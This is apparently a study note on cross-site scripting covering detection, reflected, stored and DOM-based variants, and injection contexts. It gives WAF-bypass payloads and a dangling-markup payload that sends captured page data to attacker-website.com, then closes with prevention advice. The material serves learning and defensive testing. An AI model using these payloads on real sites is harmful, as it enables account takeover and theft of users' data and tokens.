- [General Concept](#general-concept)
- [Detection](#detection)
- [Types](#types)
  - [Reflected XXS](#reflected-xxs)
  - [Stored XXS](#stored-xxs)
  - [DOM-Based XXS](#dom-based-xxs)
- [Contexts](#contexts)
  - [Between HTML Tags](#between-html-tags)
  - [In HTML Tag Attributes](#in-html-tag-attributes)
  - [Into JS](#into-js)
  - [Breaking Out of JS string](#breaking-out-of-js-string)
  - [HTML Encoding](#html-encoding)
  - [JS Template Literals](#js-template-literals)
  - [Via Client-Side Template Injection](#via-client-side-template-injection)
- [Dangling Markup Injection](#dangling-markup-injection)
  - [Prevention](#prevention)
- [Prevention](#prevention-1)
  - [Content Security Policy](#content-security-policy)
  - [Language Specific](#language-specific)
    - [PHP](#php)
    - [Java](#java)
- [References](#references)

# General Concept
Cross-site scripting is a WebSec vuln that allows attackers to circumvent the same 
origin policy and lets them masquerade as a victim user (able to carry out actions as them
and give access to their data). If they impersonate a privileged user, then they might be
able to gain full control over the app. 

XXS manipulates a website so that it returns malicious JS to users. When the JS executes 
in the browser, the attacker can fully compromise the user's interaction with the application. 

# Detection
Can confirm most kinds by injecting a payload that causes your browser to execute some
arbitrary JS. Common practice to use the `alert()` function because it's hard to miss. 
In Chrome >=v92 cross-origin iframes (which are used to construct more advanced XXS attacks)
are prevented from calling `alert()` so PortSwigger recommends using `print()`
[[1]](https://portswigger.net/research/alert-is-dead-long-live-print). 

To manually test for reflected, stored, and URL parameter-based DOM XXS, usually have to
submit some simple + unique input  into every entry point in the app, IDing every location
where the input is returned in HTTP responses/DOM, and then testing each location to find out
if a suitable input can be used to execute arbitrary JS. 

To manually test for other DOM-based XXS, you kinda just have to read the site's JS code. 

Can also be found with tools like Burp Suite's web vuln scanner. 

# Types
| Type | Summary |
| ---- | ------- |
| Reflected XXS | Malicious script comes from the current HTTP request |
| Stored XXS | Malicious script comes from the website's database |
| DOM-Based XXS | The vulnerability is in the client-side code rather than server-side |

## Reflected XXS
Simplest variety. When an application receives data in an HTTP request
that includes the data within the immediate response in an unsafe way. 

If the site doesn't do any extra processing, the attacker can construct the URL
and if the user visits, the script will run as the user, giving it access to any action/data
the user has access to

```
Example:

  **intended use**
  https://insecure-site.com/status?message=All+is+well.
  <p>Status: All is well.</p>

  **attacker use**
  https://insecure-site.com/status?message=<script>...</script>
  <p>Status: <script>...</script>
```

Because it's delivered through a link that the user needs to click on, it's generally less 
severe than stored XXS. 

## Stored XXS
Also known as persistent or second-order XXS. When an app receives data from an untrusted source 
and includes that data within its later HTTP responses in an unsafe way. 

The data might be submitted via HTTP requests (comments on a blog post, user nicknames, 
contact details, etc) but it can also come from other untrusted sources, like a webmail 
application displaying messages received over SMTP, a marketing application displaying 
social media posts, or a network monitoring application displaying packet data from network 
traffic.

```
Example:
  **intended use**
  <p>Hello, this is my message!</p>

  **attacker use**
  <p><script>...</script></p>

If there's a message board that lets users submit messages that get displayed to other users
and those messages aren't processed at all, it's vulnerable
```

## DOM-Based XXS
When an app has client-side JS that processes data  from an untrusted source in an unsafe way, 
usually by writing the data back to the DOM. 

Typically, the input field would be populated from part of the HTTP request, such as a URL 
query string parameter, allowing the attacker to deliver an attack using a malicious URL
ala reflected XXS. 

```
Example:
  var search = document.getElementById('search').value;
  var results = document.getElementById('results');
  results.innerHTML = 'You searched for: ' + search;

  You searched for: <img src=1 onerror='...'>
```
# Contexts
When testing for reflected/stored XXS, a key task is to identify the XXS context:
- The location within the response where attacker-controllable data appears
- Any input validation/other processing performed on that data by the app

## Between HTML Tags
When the context is text between HTML tags, you need to introduce some new HTML
tags designed to trigger JS execution

```
Example:
  <script>alert(1)</script>
  or
  <img src=1 onerror=alert(1) />
```

## In HTML Tag Attributes
You might be able to terminate the attribute value, close the tag, and introduce a new one

```
Example:
  "><script>alert(1)</script>
```

More commonly, the angle brackets are blocked/encoded, so you can't break out of the tag. 
If you can terminate the attribute value, you can usually introduce a new attribute that creates
a scriptable context, such as an event handler.

```
Example:
  " autofocus onfocux=alert(1) x="

The trailing x=" is to repair the following markup
```

Sometimes the HTML tag attribute can crate a scriptable context, like the `href` attribute on an
anchor tag. 

```
Example:
  <a href="javascript:alert(1)">
```

Sometimes injections are possible within tags that don't usually fire events automatically, like a 
canonical tag. You exploit this behavior using access keys and user interaction (chrome + maybe firefox).
The `accesskey` attribute lets you define a letter that when pressed with other keys (browser dependent)
causes events to fire. This can also be used to 
[exploit hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields). 

```
Example:
  https://insecure-site.com/?'accesskey='x'onclick='alert(1)
```

## Into JS
Sometimes possible to close the script tag and introduce new HTML tags that will trigger execution.

```
Example:
  **context**
  <script>
  ...
  var input = '<controllable data>'
  ..
  </script>

  **injection**
  </script><img src=1 onerror=alert(document.domain)/>
  or
  </script><script>alert(1)</script>

Works because the browser does HTML parsing first. Original script is broken (unterminated string),
but it doesn't prevent the subsequent script from being parsed + executed. 
```

## Breaking Out of JS string
Often possible to break out of the string and execute JS directly. Need to repair the script because 
syntax errors will prevent the whole script from executing.

```
Breaking out:
  '-alert(document.domain)-'
  ';alert(document.domain)//
```

Worth noting that some apps try to prevent breaking out of the string by escaping any single quote 
characters with a backslash, but many make the mistake of not escaping the backslash character itself,
so you can just add a backslash before the quote to escape the added backslash

```
Example:
  ';alert(document.domain)//  --> \';alert(document.domain)//
  \';alert(document.domain)// --> \\';alert(document.domain)//
```

Sometimes sites restrict which characters are allowed (website level or by deploying a WAF). In these 
cases, experiment with other ways of calling functions that bypass those measures. 

One way is with `throw`, enabling you to pass arguments to a function without parentheses. 

```
Example:
  onerror=alert;throw 1
  <script>{onerror=alert}throw 1</script>  -- no semi-colon

The throw statements passes 1 to the exception handler (alert)

  <script>throw onerror=alert,'some string',123','sent to exception handler'</script>

Throw create a a JS exception, onerror allows you to assign a fxn to the JS error handler,
alert will be called when any new exception is thrown, because throw accepts an expression, the
assignment to onerror happens before alert is called and the last part of the expression
is sent to the handler
```
[More about the last example](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

## HTML Encoding
When the context is some existing JS in a quoted tag attribute (ex. event handler), you can use 
HTML-encoding to get around some input filters. 

```
Example:

  Context:
    <a href="#" onclick="... var input='controlable data';...">
    application blocks/escapes single quote characters

  Input:
    &apos;-alert(document.domain)-&apos;

The &apos; sequence is an HTML entity representing a single quote. Browers HTML decodes onclick
before the JS is interpreted, so the entities are decoded as quotes that then act as string
delimiters.
```

## JS Template Literals
When the context is into a JS template literal, you don't need to terminate it. Just use the `${...}`
syntax to embed the expression that will be executed when the literal is processed. 

## Via Client-Side Template Injection
If websites use a client-side template framework and embed user input into it in an unsafe manner, 
an attacker could inject their own malicious template expressions to launch an XXS attack. 

# Dangling Markup Injection
Dangling markup injection is a technique for capturing data cross-domain when a full XXS attack
isn't possible. 

```
Example:

  Context:
    <input type="text" name="input" value="Controllable Data"
    Doesn't filter esc, >, or "

Normally an attacker would try XXS, but say it wasn't possible for some reason. It might still be
possible to deliver a dangling markup injection using a payload like the following:

  "><img src='//attacker-website.com?

This creates an img tag and defines the start of the src, but it's left "dangling" (open). When
a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate,
and everything until that point will be included as part of the URL query string.

As a consequence, the attacker can capture part of the application's response, which might contain sensitive
data (CSRF tokens, email messages, financial data, etc.)
```

Any attribute that makes an external request can be used for dangling markup. 

## Prevention
Same general defenses as XXS prevention (encoding data on output and validating input on arrival). 
Can also mitigate some attacks by using CSP. 

Note that the Chrome browser is tackling dangling markup attacks by preventing tags like `img` from 
defining URLs containing raw characters (angle brackets, newlines, etc). The data that would be 
captured will generally contain those raw characters, so the attack is blocked. 

# Prevention
| Method | Explanation |
| ------ | ----------- |
| Filter input on arrival | When user input is received, filter as strictly as possible based on expected/valid input |
| Encode data on output | When user-controllable data is output in HTTP responses encode it to prevent it from being interpreted as active content. This might require applying combos of HTML, URL, JS, and CSS encoding. |
| Use appropriate response headers | Use `Content-Type` and `X-Content-Type-Options` headers so browsers correctly interpret responses that aren't supposed to have any HTML or JS |
| Content Security Policy | Last defense to reduce severity of XXS vulns that still occur |

## Content Security Policy
CSP is a browser mechanism that aims to mitigate the impact of XXS and some other 
vulnerabilities. If an app that uses CSP contains XXS-like behavior, the CSP 
might hinder or prevent exploitation, but it can often be circumvented.

## Language Specific
### PHP
Filter inputs with a whitelist of allowed characters that use type hints/casting. 
Escape outputs with `htmlentities` and `ENT_QUOTES` for HTML contexts, or JS Unicode escapes 
for JS contexts. 

### Java
Filter inputs with a whitelist of allowed characters. 
Use a library such as Google Guave for HTML-encode output for HTML contexts or use JS 
Unicode escapes for JS contexts. 

# References
[PortSwigger XXS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
